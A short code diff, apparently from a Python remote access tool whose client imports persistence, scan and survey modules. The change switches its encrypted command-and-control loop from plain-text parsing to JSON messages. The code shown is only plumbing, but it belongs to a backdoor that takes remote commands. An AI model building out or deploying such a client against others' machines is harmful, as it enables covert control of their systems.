@@ -12,9 +12,10 @@ import sys
 import time
 
 from core import crypto, persistence, scan, survey, toolkit
+from core.transport import client_to_server, json2dict, dict2json
 
+from __init__ import __version__
 
-__version__ = '0.3'
 
 # determine system platform
 if sys.platform.startswith('win'):
@@ -34,8 +35,9 @@ def client_loop(conn, dhkey):
         # wait to receive data from server
         data = crypto.decrypt(conn.recv(4096), dhkey)
 
-        # seperate data into command and action
-        cmd, _, action = data.partition(' ')
+        # error checking here! for faulty shit (both sides of recv)
+        data = json2dict(data)
+        cmd, action = data['command'], data['action']
 
         if cmd == 'kill':
             conn.close()
@@ -79,7 +81,10 @@ def client_loop(conn, dhkey):
 
         results = results.rstrip() + '\n{} completed.'.format(cmd)
 
-        conn.send(crypto.encrypt(results, dhkey))
+        data = client_to_server(results)
+        data = dict2json(data)
+
+        conn.send(crypto.encrypt(data, dhkey))
 
 
 def get_parser():
